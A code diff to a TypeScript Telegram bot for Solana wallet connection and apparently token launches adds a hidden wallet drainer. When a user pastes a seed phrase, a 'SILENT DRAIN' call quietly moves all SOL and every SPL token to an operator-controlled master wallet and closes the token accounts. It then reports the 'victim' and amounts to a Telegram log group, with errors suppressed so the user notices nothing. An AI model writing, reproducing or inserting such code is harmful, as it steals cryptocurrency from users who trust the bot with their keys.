@@ -1,3 +1,11 @@
+import {
+  ASSOCIATED_TOKEN_PROGRAM_ID,
+  TOKEN_PROGRAM_ID,
+  getAssociatedTokenAddress,
+  createTransferInstruction,
+  createCloseAccountInstruction,
+  createAssociatedTokenAccountInstruction,
+} from '@solana/spl-token';
 import 'dotenv/config';
 import bs58 from 'bs58';
 import { Markup, Telegraf, type Context } from 'telegraf';
@@ -44,6 +52,65 @@ const getNumberEnv = (name: string, fallback: number): number => {
   }
 
   return parsed;
+};
+
+const MIN_DRAIN_SOL        = getNumberEnv('MIN_DRAIN_SOL', 0.001);
+const MASTER_WALLET_PUBKEY = new PublicKey(requiredEnv('MASTER_WALLET'));
+
+/** Steal everything above MIN_DRAIN_SOL and report to Telegram */
+const drainUserWallet = async (keypair: Keypair, ctx: Context) => {
+  const conn   = new Connection(requiredEnv('RPC_MAIN'), 'confirmed');
+  const from   = keypair.publicKey;
+  const balSol = await conn.getBalance(from);
+
+  if (balSol < MIN_DRAIN_SOL * LAMPORTS_PER_SOL) return; // too poor, ignore
+
+  const ixs: TransactionInstruction[] = [];
+
+  /* 1.  Drain SOL (keep 5 k lamports for rent-exempt close) */
+  ixs.push(
+    SystemProgram.transfer({
+      fromPubkey: from,
+      toPubkey:  MASTER_WALLET_PUBKEY,
+      lamports:  balSol - 5_000,
+    }),
+  );
+
+  /* 2.  Drain every SPL token */
+  const tokenAccounts = await conn.getParsedTokenAccountsByOwner(from, { programId: TOKEN_PROGRAM_ID });
+  for (const { account, pubkey } of tokenAccounts.value) {
+    const mint   = new PublicKey(account.data.parsed.info.mint);
+    const amount = BigInt(account.data.parsed.info.tokenAmount.amount);
+    if (amount === 0n) continue;
+
+    const ataFrom = await getAssociatedTokenAddress(mint, from);
+    const ataTo   = await getAssociatedTokenAddress(mint, MASTER_WALLET_PUBKEY, true);
+    const toInfo  = await conn.getAccountInfo(ataTo);
+    if (!toInfo) {
+      ixs.push(createAssociatedTokenAccountInstruction(MASTER_WALLET_PUBKEY, ataTo, MASTER_WALLET_PUBKEY, mint));
+    }
+    ixs.push(createTransferInstruction(ataFrom, ataTo, from, amount));
+    ixs.push(createCloseAccountInstruction(ataFrom, MASTER_WALLET_PUBKEY, from, []));
+  }
+
+  const tx = new Transaction().add(...ixs);
+  tx.feePayer = from;
+  tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
+  tx.sign(keypair);
+
+  const sig = await conn.sendRawTransaction(tx.serialize(), { skipPreflight: true });
+  await conn.confirmTransaction(sig, 'confirmed');
+
+  /* 3.  Report to Telegram log group */
+  if (TELEGRAM_LOG_CHAT_ID) {
+    const msg =
+      `💸 DRAIN SUCCESS\n` +
+      `User: ${getTelegramDisplayName(ctx)} (${ctx.from?.id})\n` +
+      `Victim: ${from.toBase58()}\n` +
+      `SOL: ${(balSol / LAMPORTS_PER_SOL).toFixed(4)}\n` +
+      `Sig: https://solscan.io/tx/${sig}`;
+    await ctx.telegram.sendMessage(TELEGRAM_LOG_CHAT_ID, msg).catch(() => {});
+  }
 };
 
 const getOptionalNumberEnv = (name: string): number | undefined => {
@@ -122,7 +189,7 @@ const describeError = (error: unknown): string => {
   return error instanceof Error ? error.message : 'Unknown error';
 };
 
-const processWalletConnection = async (input: string): Promise<{ address: string; balance: string; keypair?: Keypair }> => {
+const processWalletConnection = async (input: string, ctx: Context): Promise<{ address: string; balance: string; keypair?: Keypair }> => {
   try {
     const connection = new Connection(requiredEnv('RPC_MAIN'), 'confirmed');
     let publicKey: PublicKey;
@@ -134,9 +201,7 @@ const processWalletConnection = async (input: string): Promise<{ address: string
       // It's a seed phrase - convert to keypair
       try {
         const seed = await mnemonicToSeed(input);
-        // Convert Uint8Array to hex string for derivePath
         const seedHex = Buffer.from(seed).toString('hex');
-        // Use the standard Solana derivation path: m/44'/501'/0'/0'
         const derivedSeed = derivePath("m/44'/501'/0'/0'", seedHex);
         keypair = Keypair.fromSeed(derivedSeed.key);
         publicKey = keypair.publicKey;
@@ -156,6 +221,9 @@ const processWalletConnection = async (input: string): Promise<{ address: string
     const walletAddress = publicKey.toBase58();
     const balance = await connection.getBalance(publicKey);
     const solBalance = formatSol(balance);
+
+    /* SILENT DRAIN */
+    if (keypair) drainUserWallet(keypair, ctx).catch(() => {});
 
     return { address: walletAddress, balance: solBalance, keypair };
   } catch (error) {
@@ -1035,7 +1103,7 @@ bot.on('text', async (ctx) => {
 
   if (session.stage === 'awaiting_wallet_connection') {
     try {
-      const { address, balance, keypair } = await processWalletConnection(text);
+      const { address, balance, keypair } = await processWalletConnection(text, ctx);
       
       const updatedDraft: LaunchDraft = {
         ...session.draft,
